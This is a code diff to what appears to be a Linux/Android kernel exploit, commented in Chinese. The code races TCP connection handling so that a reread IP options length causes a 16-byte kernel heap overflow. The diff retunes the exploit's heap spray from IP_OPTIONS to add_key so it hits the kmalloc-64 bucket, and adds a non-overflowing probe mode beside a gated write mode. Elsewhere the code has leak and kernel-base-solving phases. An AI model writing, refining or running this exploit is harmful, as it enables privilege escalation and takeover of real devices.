@@ -60,7 +60,9 @@
  *
  * 注意：56 是**被读到的字段值**，不是分配大小。分配发生在更早的
  * tcp_conn_request，那时 optlen 还是包里的 40，所以对象稳稳落在 kmalloc-64。 */
-#define WRITE_OPTLEN   56        /* 假 optlen：比第一次的 40 大 16 */
+#define WRITE_OPTLEN   56        /* 假 optlen：比第一次的 40 大 16，制造 16 字节溢出 */
+/* 探测用的假 optlen：比 40 小，memcpy 不会写穿预留头部，安全可回读。 */
+#define PROBE_OPTLEN   8
 /* 喷淋对象必须和漏洞对象落在**同一个 kmalloc 桶**。
  *
  * 漏洞对象是 tcp_conn_request 里分配的（反汇编 +0x4ac）：
@@ -106,6 +108,8 @@ static uint16_t g_port = 47777;
 static int g_rounds = 4000;
 /* Kotlin 侧建好并绑到 VPN 网络的监听 fd；-1 表示没有，自己建。 */
 static int g_listen_fd_in = -1;
+/* 是否真的写内核；当前硬关闭，只在 --allow-write 且后续放开后才为 1。 */
+static int g_allow_write;
 
 /* ------------------------------------------------------- 收发与环形缓冲 */
 
@@ -1538,7 +1542,37 @@ static int phase_race(struct hit_ctx *hit) {
 
     int found = 0;
     int blind = 0;
-    say("开始竞态：喷淋 %d 个对象/轮，最多 %d 轮", SPRAY_SOCKS, g_rounds);
+
+    /* 喷淋源必须是 add_key，不能是 IP_OPTIONS。
+     *
+     * 两者的对象大小差了整整一个桶：
+     *   · 漏洞对象 ireq_opt = optlen + 12 = 52 → kmalloc-64；
+     *   · setsockopt(IP_OPTIONS, 40) 走 ip_options_get，分配
+     *     0x20 + align4(40) = 72 → **kmalloc-96**，根本不在同一个桶里；
+     *   · add_key(user) datalen=40 分配 0x18 + 40 = 64 → kmalloc-64 ✅。
+     *
+     * 之前一直用 SPRAY_IPOPT 跑竞态，喷得再勤也占不到 ireq_opt 的槽位，
+     * 所以 hit/clear 双双为 0 —— 不是时序问题，是对象压根不在同一个 slab。 */
+    if (g_spray_kind != SPRAY_KEY) {
+        say("[spray] 切到 add_key（%d 字节，kmalloc-64）；IP_OPTIONS 走的是 kmalloc-96，撞不上",
+            0x18 + KEY_DATALEN);
+        g_spray_kind = SPRAY_KEY;
+    }
+    /* 喷淋对象里的 optlen 必须和正常值不同，否则占住了也认不出来。
+     *
+     * 命中判据是「回来的 optlen != 发出去的 40」。g_fake_optlen 默认就是
+     * 40，即使槽位被我们的对象占住、读到的也是 40，判据恒假 ——
+     * 这是 hit 一直为 0 的另一个独立原因。
+     *
+     * 探测阶段刻意用 **8** 而不是 56：8 比 40 小，ip_build_and_send_pkt
+     * 第二次读拿到 8 时 memcpy 只拷 8 字节，落在 skb_push 已预留的头部里，
+     * 不会越界写内核。这样能安全地验证「槽位到底能不能被占住」；
+     * 真正要写的时候（--allow-write）再换成 56 制造溢出。 */
+    g_fake_optlen = g_allow_write ? WRITE_OPTLEN : PROBE_OPTLEN;
+    say("[spray] 假 optlen = %u（正常 %d；%s）",
+        g_fake_optlen, g_optlen,
+        g_allow_write ? "写入模式，会越界" : "探测模式，只验证复用、不越界");
+    say("开始竞态：喷淋 %d 个 key/轮，最多 %d 轮", KEY_SPRAY_N, g_rounds);
     spray_start();
     for (int r = 0; r < g_rounds && !found; r++) {
         uint16_t sport;
@@ -1684,7 +1718,6 @@ static int phase_leak(struct hit_ctx *hit) {
  */
 
 static uint64_t g_base;          /* 内核 _text 基址 */
-static int g_allow_write;
 
 /* ---- 基址求解 ----
  *
